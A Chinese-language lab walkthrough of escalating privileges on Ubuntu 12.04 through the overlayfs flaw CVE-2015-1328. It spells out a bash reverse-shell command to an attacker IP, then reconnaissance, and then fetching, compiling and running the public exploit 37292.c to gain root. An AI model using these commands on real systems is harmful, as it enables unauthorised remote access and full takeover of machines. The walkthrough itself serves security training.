### overlayfs 内核提权（CVE-2015-1328）

环境准备：一台 KaliLinux（攻击者）和一台 Ubuntu 12.04.5（靶标）

![](https://pic1.imgdb.cn/item/68bf548958cb8da5c88af39e.png)

![](https://pic1.imgdb.cn/item/68bf54b358cb8da5c88af3bc.png)

在靶标上手动创建反弹 Shell 模拟已进入内网情况

```sh
bash -i >& /dev/tcp/192.168.41.151/6767 0>&1
```

**`bash -i`**

- 启动一个 **交互式 bash shell** (`-i` 代表 interactive)
- 这样子进程不会只是执行一次命令后退出，而是会等待用户输入

------

**`/dev/tcp/192.168.41.151/6767`**

- 在 **bash 内置的特殊文件系统**中，`/dev/tcp/HOST/PORT` 表示一个 TCP 连接
- 当你尝试对它进行重定向时，bash 会尝试连接指定的 IP 和端口
- 这里就是：尝试建立到 `192.168.41.151:6767` 的 TCP 连接

------

 **`>&`**

- 这是 **标准输出和标准错误的重定向**
- `>& target` 表示把 **stdout (1) 和 stderr (2)** 一起重定向到目标
- 在这里，目标是 `/dev/tcp/192.168.41.151/6767`，即远程 TCP 连接

------

**`0>&1`**

- 把 **标准输入 (0)** 重定向到 **标准输出 (1)**
- 而标准输出已经被重定向到远程 TCP 连接，因此输入也会来自那个连接

------

**综合效果**

- 启动一个交互式 bash shell (`bash -i`)
- 该 shell 的输入、输出、错误流都被重定向到远程 TCP 连接 (`192.168.41.151:6767`)
- **结果**：一旦远程主机在该端口上监听，执行这条命令的机器就会反向连接过去，并且把一个交互式 shell 提供给远程主机

![](https://pic1.imgdb.cn/item/68bf558958cb8da5c88af412.png)

KaliLinux 监听

![](https://pic1.imgdb.cn/item/68bf559e58cb8da5c88af41b.png)

**先信息收集**

显示系统的内核和系统信息

```sh
uname -a
```

![](https://pic1.imgdb.cn/item/68bf55f258cb8da5c88af437.png)

**Linux**

 → 内核名称 (kernel name)

**ubuntu**
 → 主机名 (hostname)

**3.13.0-32-generi
 → 内核发行版本 (kernel release)

- `3.13.0` → 主版本号
- `-32` → 修订版本号
- `-generic` → 内核构建类型（通用版，Ubuntu 默认）

**#57~precise1-Ubuntu**
 → 内核编译版本号 (build number)

- `#57` → 这是第 57 次构建
- `precise1-Ubuntu` → Ubuntu 针对 **12.04 LTS (Precise Pangolin)** 发布的内核

**SMP**
 → Symmetric MultiProcessing，支持多核 CPU

**Tue Jul 15 03:50:54 UTC 2014**
 → 内核的编译时间

**i686 i686 i386**

- `i686` → CPU 类型（Intel 686 级别，表示 32 位 CPU 架构）
- 第二个 `i686` → machine 硬件名称
- `i386` → 表示兼容 32 位 i386 架构

> 说明这是一个 **32 位 Ubuntu 系统**

**GNU/Linux**
 → 操作系统名称

显示 Linux 内核版本信息

```sh
cat /proc/version
```

![](https://pic1.imgdb.cn/item/68bf563358cb8da5c88af446.png)

**Linux version 3.13.0-32-generic**
 → 内核版本号：`3.13.0-32-generic`

**(buildd@toyol)**
 → 内核构建时使用的构建账号和主机名：

- `buildd` 是 Ubuntu 自动构建系统的用户
- `toyol` 是构建服务器的主机名

**(gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu5))**
 → 内核编译时所用的 GCC 编译器版本：`4.6.3`，来自 Ubuntu/Linaro

**#57~precise1-Ubuntu**
 → 内核构建号：第 57 次构建，适配 **Ubuntu 12.04 (Precise Pangolin)**

**SMP**
 → 表示支持对称多处理 (Symmetric MultiProcessing)，即多核 CPU

**Tue Jul 15 03:50:54 UT**
 → 内核编译时间（UTC 时间）

检查是否有 GCC（在提权前忘记敲了，补一张提权后的）

```sh
gcc
```

出现这个报错是因为我们没有提供要编译的文件，可见靶机有 GCC

![](https://pic1.imgdb.cn/item/68bf570e58cb8da5c88af47f.png)

搜索前面收集到的内核信息，查找可利用的提权漏洞

```sh
searchsploit Linux ubuntu 3.13.0
```

`searchsploit` 是 **Exploit Database (Exploit-DB)** 提供的一个命令行搜索工具

它允许你在本地离线搜索 **漏洞利用代码 (exploits)** 和 **漏洞 PoC (proof-of-concept)**

![](https://pic1.imgdb.cn/item/68bf577958cb8da5c88af498.png)

因为有 GCC，所以使用第一个 `.c` 来编译提权，先看看路径

```sh
locate linux/local/37292.c
```

**`locate`**

- 是一个基于数据库的文件搜索命令
- 它会在 `mlocate.db` 或 `updatedb` 生成的索引库里查找匹配路径的文件，而不是逐目录扫描（所以速度比 `find` 快很多）

因为要想办法在靶机上执行这个文件提权，所以先拷贝到根目录下再用 Python 开启个 `http.server` 传过去（根目录更方便些）

```sh
cp /usr/share/exploitdb/exploits/linux/local/37292.c .
```

![](https://pic1.imgdb.cn/item/68bf586558cb8da5c88af4d4.png)

开启服务器

```
python -m http.server 8989
```

**`python -m`**

- `-m` 参数表示以模块方式运行
- 这里调用的是 **`http.server`** 模块

**`http.server`**

- Python 标准库自带的一个简易 HTTP 服务器
- 默认会把当前目录作为网站根目录

**`8989`**

- 指定端口号（默认是 `8000`，这里改成了 `8989`）
- 启动后浏览器访问 `http://<IP>:8989/` 就能看到当前目录下的文件

再用 `wget` 访问下载我们的 `37292.c` 文件

```sh
wget 192.168.41.151:8989/37292.c
```

![](https://pic1.imgdb.cn/item/68bf598058cb8da5c88af600.png)

![](https://pic1.imgdb.cn/item/68bf59a658cb8da5c88af635.png)

使用 GCC 编译 C 文件

```sh
gcc -o exp 37292.c
```

`-o` 表示输出文件名

查看是否有可执行权限

![](https://pic1.imgdb.cn/item/68bf59db58cb8da5c88af677.png)

运行文件提权成功

```sh
./exp
```

![](https://pic1.imgdb.cn/item/68bf5a3758cb8da5c88af6c6.png)